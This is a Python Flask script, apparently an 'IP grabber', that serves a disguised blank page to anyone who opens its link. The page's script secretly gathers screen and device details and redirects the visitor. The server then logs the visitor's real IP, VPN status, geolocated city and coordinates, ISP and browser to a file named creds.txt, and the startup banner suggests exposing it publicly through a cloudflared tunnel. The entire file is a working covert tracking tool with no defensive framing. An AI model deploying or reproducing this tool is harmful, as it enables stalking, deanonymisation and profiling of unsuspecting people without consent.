#!/usr/bin/env python3

from flask import Flask, request, redirect
import requests
import socket
import datetime
import platform
import os
import sys

app = Flask(__name__)

# ========== OS DETECTION ==========
def detect_os():
    """Detect the operating system"""
    system = platform.system().lower()
    if 'windows' in system:
        return 'windows'
    elif 'darwin' in system:
        return 'macos'
    elif 'linux' in system:
        # Check if running in Termux
        if 'com.termux' in os.environ.get('PREFIX', '') or os.path.exists('/data/data/com.termux'):
            return 'termux'
        else:
            return 'linux'
    else:
        return 'unknown'

CURRENT_OS = detect_os()

# ========== OS-SPECIFIC FUNCTIONS ==========
def clear_terminal():
    """Clear terminal - works on all OS"""
    if CURRENT_OS == 'windows':
        os.system('cls')
    else:  # Linux, macOS, Termux
        os.system('clear')

def supports_color():
    """Check if terminal supports colors"""
    if CURRENT_OS == 'windows':
        # Windows 10+ supports ANSI colors
        return platform.release() >= '10'
    else:
        # Most Unix-like systems support colors
        return sys.stdout.isatty()

# ========== ASCII ART ==========
IP_GRB_PLAIN = """
$$$$$$\ $$$$$$$\         $$$$$$\                     $$\       $$\                           
\_$$  _|$$  __$$\       $$  __$$\                    $$ |      $$ |                          
  $$ |  $$ |  $$ |      $$ /  \__| $$$$$$\  $$$$$$\  $$$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
  $$ |  $$$$$$$  |      $$ |$$$$\ $$  __$$\ \____$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
  $$ |  $$  ____/       $$ |\_$$ |$$ |  \__|$$$$$$$ |$$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|
  $$ |  $$ |            $$ |  $$ |$$ |     $$  __$$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
$$$$$$\ $$ |            \$$$$$$  |$$ |     \$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$$\ $$ |      
\______|\__|             \______/ \__|      \_______|\_______/ \_______/  \_______|\__|      
"""

# Colored version (for terminals that support it)
IP_GRB_COLORED = """
\033[92m
$$$$$$\ $$$$$$$\         $$$$$$\                     $$\       $$\                           
\_$$  _|$$  __$$\       $$  __$$\                    $$ |      $$ |                          
  $$ |  $$ |  $$ |      $$ /  \__| $$$$$$\  $$$$$$\  $$$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
  $$ |  $$$$$$$  |      $$ |$$$$\ $$  __$$\ \____$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
  $$ |  $$  ____/       $$ |\_$$ |$$ |  \__|$$$$$$$ |$$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|
  $$ |  $$ |            $$ |  $$ |$$ |     $$  __$$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
$$$$$$\ $$ |            \$$$$$$  |$$ |     \$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$$\ $$ |      
\______|\__|             \______/ \__|      \_______|\_______/ \_______/  \_______|\__|      
\033[0m
"""

# Choose the right version
IP_GRB = IP_GRB_COLORED if supports_color() else IP_GRB_PLAIN

# ========== EMOJI SUPPORT ==========
def get_emoji(emoji_name):
    """Return emoji if supported, otherwise return text"""
    # Check if terminal supports emojis (most modern terminals do)
    if CURRENT_OS in ['termux', 'macos', 'linux'] or (CURRENT_OS == 'windows' and platform.release() >= '10'):
        emojis = {
            'calendar': '📅',
            'globe': '🌐',
            'lock': '🔒',
            'red': '🔴',
            'green': '🟢',
            'orange': '🟠',
            'location': '📍',
            'map': '🗺️',
            'city': '🏙️',
            'compass': '🧭',
            'clock': '⏰',
            'time': '⏱️',
            'speech': '🗣️',
            'block': '🚫',
            'computer': '🖥️',
            'gpu': '🎮',
            'browser': '🌍',
            'os': '💻',
            'mobile': '📱',
            'search': '🔍',
            'house': '🏠',
            'gear': '⚙️',
            'plug': '🔌',
            'building': '🏢',
            'numbers': '🔢',
            'star': '⭐',
            'warning': '⚠️',
            'check': '✅',
            'fire': '🔥',
            'chart': '📊',
            'folder': '📁'
        }
        return emojis.get(emoji_name, '')
    else:
        return ''  # No emoji for old terminals

# ========== CORE FUNCTIONS ==========
def get_real_ip():
    """Get real IPv4 address of visitor"""
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    elif request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def check_vpn_proxy(ip):
    """Check if IP is VPN/Proxy"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,proxy,hosting', timeout=5)
        data = response.json()
        
        if data.get('status') == 'success':
            if data.get('proxy'):
                return f"{get_emoji('red')} VPN/Proxy Detected"
            if data.get('hosting'):
                return f"{get_emoji('orange')} Hosting/DataCenter IP"
    except:
        pass
    
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        data = response.json()
        
        if data.get('vpn') or data.get('proxy') or data.get('tor'):
            return f"{get_emoji('red')} VPN/Proxy/Tor Detected"
    except:
        pass
    
    return f"{get_emoji('green')} No VPN/Proxy Detected"

def get_location_info(ip):
    """Get location information"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,as,mobile', timeout=5)
        data = response.json()
        
        if data.get('status') == 'success':
            return {
                "country": data.get('country', 'N/A'),
                "region": data.get('regionName', 'N/A'),
                "city": data.get('city', 'N/A'),
                "latitude": data.get('lat', 'N/A'),
                "longitude": data.get('lon', 'N/A'),
                "timezone": data.get('timezone', 'N/A'),
                "isp": data.get('isp', 'N/A'),
                "org": data.get('org', 'N/A'),
                "as": data.get('as', 'N/A'),
                "mobile": data.get('mobile', False)
            }
    except:
        pass
    
    return {
        "country": "N/A", "region": "N/A", "city": "N/A",
        "latitude": "N/A", "longitude": "N/A", "timezone": "N/A",
        "isp": "N/A", "org": "N/A", "as": "N/A", "mobile": False
    }

def parse_user_agent(user_agent):
    """Parse User-Agent string"""
    browser = "Unknown"
    os_info = "Unknown"
    
    if 'Firefox' in user_agent:
        browser = 'Firefox'
    elif 'Chrome' in user_agent and 'Edg' not in user_agent:
        browser = 'Chrome'
    elif 'Safari' in user_agent and 'Chrome' not in user_agent:
        browser = 'Safari'
    elif 'Edg' in user_agent:
        browser = 'Edge'
    elif 'OPR' in user_agent:
        browser = 'Opera'
    
    if 'Windows' in user_agent:
        os_info = 'Windows'
    elif 'Mac OS' in user_agent:
        os_info = 'macOS'
    elif 'Linux' in user_agent and 'Android' not in user_agent:
        os_info = 'Linux'
    elif 'Android' in user_agent:
        os_info = 'Android'
    elif 'iPhone' in user_agent:
        os_info = 'iOS'
    elif 'iPad' in user_agent:
        os_info = 'iPadOS'
    
    return browser, os_info

# ========== FLASK ROUTES ==========
@app.route('/')
def index():
    """Main endpoint"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>.</title>
        <style>body{background:#000;}</style>
    </head>
    <body>
        <script>
            var data = {
                sw: screen.width,
                sh: screen.height,
                cd: screen.colorDepth,
                touch: 'ontouchstart' in window ? 'Yes' : 'No',
                orientation: screen.orientation ? screen.orientation.type : window.orientation || 'N/A'
            };
            var params = new URLSearchParams(data);
            window.location.href = '/collect?' + params.toString();
        </script>
    </body>
    </html>
    """
    return html

@app.route('/collect')
def collect():
    """Collect and display information"""
    clear_terminal()
    
    # Print IP GRB ASCII art
    print(IP_GRB)
    
    # Get data
    ip = get_real_ip()
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    vpn_status = check_vpn_proxy(ip)
    loc = get_location_info(ip)
    user_agent = request.headers.get('User-Agent', 'N/A')
    browser, os_info = parse_user_agent(user_agent)
    
    # Screen info
    screen_width = request.args.get('sw', 'N/A')
    screen_height = request.args.get('sh', 'N/A')
    screen_size = f"{screen_width}x{screen_height}" if screen_width != 'N/A' else 'N/A'
    
    # OS Info
    hostname = socket.gethostname()
    system_platform = platform.system()
    
    # Format data with emojis (if supported)
    e = get_emoji  # Shortcut
    
    print(f"{e('calendar')} Date/Time: {current_time}")
    print(f"{e('globe')} IP Address: {ip}")
    print(f"{e('lock')} VPN/Proxy: {vpn_status}")
    print(f"{e('location')} Country: {loc['country']}")
    print(f"{e('map')} Region: {loc['region']}")
    print(f"{e('city')} City: {loc['city']}")
    print(f"{e('compass')} Orientation: {request.args.get('orientation', 'N/A')}")
    print(f"{e('clock')} Timezone: {loc['timezone']}")
    print(f"{e('time')} User Time: {datetime.datetime.now().strftime('%H:%M:%S')}")
    print(f"{e('speech')} Language: {request.headers.get('Accept-Language', 'N/A').split(',')[0]}")
    print(f"{e('block')} Ad Blocker: N/A")
    print(f"{e('computer')} Screen Size: {screen_size}")
    print(f"{e('gpu')} GPU: N/A")
    print(f"{e('browser')} Browser: {browser}")
    print(f"{e('os')} Operating System: {os_info}")
    print(f"{e('mobile')} Touch Screen: {request.args.get('touch', 'N/A')}")
    print(f"{e('search')} User Agent: {user_agent[:100]}")
    print(f"{e('house')} Host Name: {hostname}")
    print(f"{e('gear')} Platform: {system_platform}")
    print(f"{e('plug')} ISP: {loc['isp']}")
    print(f"{e('building')} Organization: {loc['org']}")
    print(f"{e('numbers')} AS Number: {loc['as']}")
    print(f"{e('location')} Coordinates: {loc['latitude']}, {loc['longitude']}")
    print()
    print(f"{get_emoji('star')} OS Detected: {CURRENT_OS.upper()}")
    print("-" * 40)
    print()
    
    # Save ALL details to creds.txt (always without emojis for compatibility)
    with open("creds.txt", "a", encoding='utf-8') as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"DATE/TIME: {current_time}\n")
        f.write(f"{'='*60}\n")
        f.write(f"IP Address: {ip}\n")
        f.write(f"VPN/Proxy: {vpn_status.replace('🔴','').replace('🟢','').replace('🟠','')}\n")
        f.write(f"Country: {loc['country']}\n")
        f.write(f"Region: {loc['region']}\n")
        f.write(f"City: {loc['city']}\n")
        f.write(f"Orientation: {request.args.get('orientation', 'N/A')}\n")
        f.write(f"Timezone: {loc['timezone']}\n")
        f.write(f"User Time: {datetime.datetime.now().strftime('%H:%M:%S')}\n")
        f.write(f"Language: {request.headers.get('Accept-Language', 'N/A').split(',')[0]}\n")
        f.write(f"Ad Blocker: N/A\n")
        f.write(f"Screen Size: {screen_size}\n")
        f.write(f"GPU: N/A\n")
        f.write(f"Browser: {browser}\n")
        f.write(f"Operating System: {os_info}\n")
        f.write(f"Touch Screen: {request.args.get('touch', 'N/A')}\n")
        f.write(f"User Agent: {user_agent}\n")
        f.write(f"Host Name: {hostname}\n")
        f.write(f"Platform: {system_platform}\n")
        f.write(f"ISP: {loc['isp']}\n")
        f.write(f"Organization: {loc['org']}\n")
        f.write(f"AS Number: {loc['as']}\n")
        f.write(f"Coordinates: {loc['latitude']}, {loc['longitude']}\n")
        f.write(f"{'='*60}\n")
    
    # Blank page
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>.</title>
        <style>body{background:#000;margin:0;padding:0;display:none;}</style>
    </head>
    <body></body>
    </html>
    """

@app.route('/stats')
def stats():
    """Stats page"""
    try:
        with open("creds.txt", "r", encoding='utf-8') as f:
            content = f.read()
            count = content.count('='*60)
    except:
        count = 0
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Stats</title>
        <style>
            body {{ background: #000; color: #0f0; font-family: monospace; padding: 20px; }}
            .box {{ border: 1px solid #0f0; padding: 20px; }}
        </style>
    </head>
    <body>
        <div class="box">
            <h1>IP GRB - STATS</h1>
            <p>Total Visitors: {count}</p>
            <p>Status: Active</p>
            <p>OS: {CURRENT_OS.upper()}</p>
            <p>📁 Data saved in: creds.txt</p>
        </div>
    </body>
    </html>
    """

# ========== MAIN ==========
if __name__ == "__main__":
    clear_terminal()
    
    # Print startup info
    print(IP_GRB)
    print("=" * 40)
    print(f"{get_emoji('fire')} Server Status: RUNNING")
    print(f"{get_emoji('star')} Detected OS: {CURRENT_OS.upper()}")
    print("=" * 40)
    print(f"{get_emoji('location')} Local URL: http://127.0.0.1:5000")
    print(f"{get_emoji('globe')} For cloudflared: cloudflared tunnel --url http://localhost:5000")
    print(f"{get_emoji('folder')} All data saved to: creds.txt")
    print("=" * 40)
   
    app.run(host='0.0.0.0', port=5000, debug=False)
